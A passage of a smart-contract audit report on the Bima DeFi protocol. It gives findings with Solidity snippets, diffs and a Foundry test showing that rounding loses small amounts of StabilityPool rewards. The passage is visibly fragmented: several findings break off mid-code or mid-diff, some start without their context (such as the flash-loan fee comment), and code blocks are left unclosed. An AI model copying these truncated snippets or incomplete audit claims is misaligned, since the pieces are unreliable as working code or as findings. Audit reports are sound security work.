**Impact:** Not all the weekly token emissions allocated to `StabilityPool` get distributed to depositors; small amounts are never distributed and effectively lost.

**Proof of Concept:** Add the PoC to `test/foundry/core/StabilityPoolTest.t.sol`:
```solidity
function test_claimReward_smallAmountOfStabilityPoolRewardsLost() external {
    // setup vault giving user1 half supply to lock for voting power
    uint256 initialUnallocated = _vaultSetupAndLockTokens(INIT_BAB_TKN_TOTAL_SUPPLY/2);

    // user votes for stability pool to get emissions
    IIncentiveVoting.Vote[] memory votes = new IIncentiveVoting.Vote[](1);
    votes[0].id = stabilityPool.SP_EMISSION_ID();
    votes[0].points = incentiveVoting.MAX_POINTS();

    vm.prank(users.user1);
    incentiveVoting.registerAccountWeightAndVote(users.user1, 52, votes);

    // user1 and user 2 both deposit 10K into the stability pool
    uint96 spDepositAmount = 10_000e18;
    _provideToSP(users.user1, spDepositAmount, 1);
    _provideToSP(users.user2, spDepositAmount, 1);

    // warp time by 1 week
    vm.warp(block.timestamp + 1 weeks);

    // calculate expected first week emissions
    uint256 firstWeekEmissions = initialUnallocated*INIT_ES_WEEKLY_PCT/BIMA_100_PCT;
    assertTrue(firstWeekEmissions > 0);
    assertEq(babelVault.unallocatedTotal(), initialUnallocated);

    uint16 systemWeek = SafeCast.toUint16(babelVault.getWeek());

    // no rewards in the same week as emissions
    vm.prank(users.user1);
    uint256 userReward = stabilityPool.claimReward(users.user1);
    assertEq(userReward, 0);

    // verify emissions correctly set in BabelVault for first week
    assertEq(babelVault.weeklyEmissions(systemWeek), firstWeekEmissions);

    // warp time by 1 week
    vm.warp(block.timestamp + 1 weeks);

    // rewards for the first week can be claimed now
    vm.prank(users.user1);
    userReward = stabilityPool.claimReward(users.user1);

    // verify user1 receives half of the emissions
    assertEq(firstWeekEmissions/2, 268435455937500000000000000);
    assertEq(userReward,           268435455937499999999890000);

    // user 2 claims their reward
    vm.prank(users.user2);
    userReward = stabilityPool.claimReward(users.user2);
    assertEq(userReward,           268435455937499999999890000);

    // firstWeekEmissions = 536870911875000000000000000
    // userReward * 2     = 536870911874999999999780000
    //
    // a small amount of rewards was not distributed and is effectively lost
}
```

Run with: `forge test --match-contract StabilityPoolTest --match-test test_claimReward_smallAmountOfStabilityPoolRewardsLost -vvv`

**Recommended Mitigation:** This issue was found towards the end of the audit when filling in missing test suite coverage so the cause has not yet been determined and remains for the protocol team to investigate using the test suite.

### Incorrect comment regarding the configuration of `DebtToken::FLASH_LOAN_FEE` parameter

```

So the comment indicating that 1 = 0.0001% is incorrect:

```diff
File: DebtToken.sol
- uint256 public constant FLASH_LOAN_FEE = 9; // 1 = 0.0001%

### `TokenLocker::withdrawWithPenalty` should revert if nothing is withdrawn

    // penalty withdrawals must be enabled by admin
    require(penaltyWithdrawalsEnabled, "Penalty withdrawals are disabled");

+   // revert on zero input
+   require(amountToWithdraw != 0, "Must withdraw a positive amount");
```

Then after the loop, if the user specified a max withdraw, checking performing a similar check:
```diff
// if users tried to withdraw as much as possible, then subtract
// the "unfilled" net amount (not inc penalties) from the user input
// which gives the "filled" amount (not inc penalties)
if (amountToWithdraw == type(uint256).max) {
    amountToWithdraw -= remaining;

+   // revert if nothing was withdrawn, eg if user had no locked
+   // tokens but attempted withdraw with input type(uint256).max

### `TokenLocker::freeze` always emits `LocksFrozen` event with 0 amount

**Description:** `TokenLocker::freeze` has a `while` loop that decrements `locked` and only exits when `locked == 0`, then the `LocksFrozen` event is always emitted afterwards with `locked = 0`:
```solidity
uint256 bitfield = accountData.updateWeeks[systemWeek / 256] >> (systemWeek % 256);
// @audit loop only exits when locked == 0
while (locked > 0) {
    systemWeek++;
    if (systemWeek % 256 == 0) {
        bitfield = accountData.updateWeeks[systemWeek / 256];
        accountData.updateWeeks[(systemWeek / 256) - 1] = 0;
    } else {
        bitfield = bitfield >> 1;
    }
    if (bitfield & uint256(1) == 1) {
        uint32 amount = unlocks[systemWeek];
        unlocks[systemWeek] = 0;
        totalWeeklyUnlocks[systemWeek] -= amount;
        // @audit locked decremented
        locked -= amount;
    }
}
accountData.updateWeeks[systemWeek / 256] = 0;
// @audit locked will always be 0 here
emit LocksFrozen(msg.sender, locked);
```

**Recommended Mitigation:** Emit the event before the `while` loop.

### Enforce 18 decimal collateral tokens in `Factory::deployNewInstance`

**Description:** The protocol assumes collateral tokens decimals are 18.

**Proof of Concept:** While calculating a `TCR` in [BorrowerOperations::_getTCRData](https://github.com/Bima-Labs/bima-v1-core/blob/main/contracts/core/BorrowerOperations.sol#L583), it uses a raw collateral amount.

```solidity
    function _getTCRData(
        SystemBalances memory balances
    ) internal pure returns (uint256 amount, uint256 totalPricedCollateral, uint256 totalDebt) {
        uint256 loopEnd = balances.collaterals.length;
        for (uint256 i; i < loopEnd; ) {
            totalPricedCollateral += (balances.collaterals[i] * balances.prices[i]);
            totalDebt += balances.debts[i];
            unchecked {
                ++i;
            }
        }
        amount = BabelMath._computeCR(totalPricedCollateral, totalDebt);

        return (amount, totalPricedCollateral, totalDebt);
    }

    function _computeCR(uint256 _coll, uint256 _debt) internal pure returns (uint256) {
        if (_debt > 0) {
            uint256 newCollRatio = (_coll) / _debt;

            return newCollRatio;
        }
        // Return the maximal value for uint256 if the Trove has a debt of 0. Represents "infinite" CR.
        else {
            // if (_debt == 0)
            return 2 ** 256 - 1;
        }

```

It gets `TCR = collaterals * prices / debt` and compares with [CCR](https://github.com/Bima-Labs/bima-v1-core/blob/main/contracts/dependencies/BabelBase.sol#L14) which has 18 decimals.

**Recommended Mitigation:** This is not a problem since all collateral tokens the protocol intends to support have 18 decimals. However when enabling a new collateral in `Factory::deployNewInstance` this should only allow 18 decimal tokens.

### Consolidate `10000`, `MAX_FEE_PCT` and `MAX_PCT` used in many contracts into one shared constant

**Description:** Many contracts throughout the protocol use literal `10000` or have `MAX_PCT` or `MAX_FEE_PCT` constants with this number; consolidate all of these into one shared constant in a new file `/dependencies/Constants.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

// represents 100% in BIMA used in denominator when
// calculating amounts based on a percentage
uint256 constant BIMA_100_PCT = 10_000;

### `StorkOracleWrapper` assumes all price feeds return 18 decimal prices

**Description:** `StorkOracleWrapper` assumes all price feeds return 18 decimal prices and hard-codes dividing by 1e10 to return values in 8 decimals.

Stork's documentation does not have publicly available information on what decimal precision their price feeds return; Bima should be careful to verify that every price feed which it uses with `StorkOracleWrapper` does indeed return a native 18 decimal value.

**Bima:**
Acknowledged - yes all prices from Stork Oracle are in 18 decimals.

### More efficient and simpler implementation of `BabelVault::setReceiverIsActive`

**Description:** `BabelVault::setReceiverIsActive` doesn't need to cache `idToReceiver[id]` into memory since it only reads the `account` field so there is no reason to read every field from storage.

Also it only updates the `isActive` field so there is no reason to update all the fields by writing the memory copy back to storage. A more efficient and simpler implementation is:
```solidity
function setReceiverIsActive(uint256 id, bool isActive) external onlyOwner returns (bool success) {
    // revert if receiver id not associated with an address
    require(idToReceiver[id].account != address(0), "ID not set");

    // update storage - isActive status, address remains the same
    idToReceiver[id].isActive = isActive;

    emit ReceiverIsActiveStatusModified(id, isActive);

    success = true;
}

### Remove `BabelVault::receiverUpdatedWeek` and add `updatedWeek` member to struct `Receiver`

**Description:** The mapping `idToReceiver` already links the receiver id to the receiver's data:

```

Hence it is simpler & cleaner to remove `BabelVault::receiverUpdatedWeek` and add an `updatedWeek` member to struct `Receiver`:
```diff
-   // id -> receiver data
-   uint16[65535] public receiverUpdatedWeek;

    struct Receiver {
        address account;
        bool isActive;
+       uint16 updatedWeek;

### Save 2 storage reads in `StabilityPool::enableCollateral`

**Description:** Save 2 storage reads in `StabilityPool::enableCollateral` by:

1) Reading from `queueCached.firstSunsetIndexKey` then writing after:
```diff
- delete _sunsetIndexes[queue.firstSunsetIndexKey++];
+ delete _sunsetIndexes[queueCached.firstSunsetIndexKey];
+ ++queue.firstSunsetIndexKey;
```

2) Using `length + 1` instead of `collateralTokens.length`:
```diff
  collateralTokens.push(_collateral);
- indexByCollateral[_collateral] = collateralTokens.length;
+ indexByCollateral[_collateral] = length + 1;
```

### Save two storage slots by better storage packing in `TroveManager`

**Description:** Save two storage slots by better storage packing in `TroveManager` - relocate these 3 declarations under `periodFinish`:
```solidity
uint256 public rewardIntegral;
uint128 public rewardRate;
uint32 public lastUpdate;
uint32 public periodFinish;

// here for storage packing
bool public sunsetting;
bool public paused;
EmissionId public emissionId;
```

Ideally `TroveManager` storage would also be refactored to group all declarations together in common sections.

### Optimize away `currentActiveDebt` and `activeInterests` variables from `TroveManager::getEntireSystemDebt`

**Description:** `TroveManager::getEntireSystemDebt` can optimize away the `currentActiveDebt` and `activeInterests` variable by reading `totalActiveDebt` straight into the named output variable then using that, eg:
```solidity
function getEntireSystemDebt() public view returns (uint256 debt) {
    debt = totalActiveDebt;

    (, uint256 interestFactor) = _calculateInterestIndex();

    if (interestFactor > 0) {
        debt += Math.mulDiv(debt, interestFactor, INTEREST_PRECISION);
    }

    debt += defaultedDebt;
}
```

The same optimization can be applied to `TroveManager::getTotalActiveDebt`.

### Delete `TroveManager::_removeStake` and perform this as part of `_closeTrove` since they always occur together

**Description:** `TroveManager::_removeStake`  is only ever called immediately before `_closeTrove` so the function can be deleted and its functionality implemented more efficiently inside `_closeTrove` like this:
```solidity
function _closeTrove(address _borrower, Status closedStatus) internal {
    uint256 TroveOwnersArrayLength = TroveOwners.length;

    // update storage - borrower Trove state
    Trove storage t = Troves[_borrower];
    t.status = closedStatus;
    t.coll = 0;
    t.debt = 0;
    t.activeInterestIndex = 0;
    // _removeStake functionality
    totalStakes -= t.stake;
    t.stake = 0;
    // ...
```

This also ensures that a coding mistake couldn't be made in the future where `_closeTrove` would be called while forgetting to first call `_removeStake`.
